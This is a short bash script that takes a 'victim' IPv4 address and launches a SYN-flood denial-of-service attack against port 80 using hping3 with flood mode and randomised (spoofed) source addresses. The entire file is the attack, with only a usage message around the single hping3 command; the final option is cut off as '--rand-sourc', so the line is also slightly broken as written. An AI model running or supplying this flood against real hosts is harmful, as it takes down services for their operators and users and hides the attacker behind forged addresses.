#!/bin/bash

helpFunction() {
	echo ""
	echo "Usage: $0  destination"
	echo -e "\tdestination: IPv4 destination of victim"
	exit 1 # Exit script after printing help
}
#
# Print helpFunction in case parameters are empty
if [ "$#" -ne 1 ]; then
	echo "Destination must be specified"
	helpFunction
fi

hping3 $1 -q -n -d 120 -S -p 80 --flood --rand-sourc
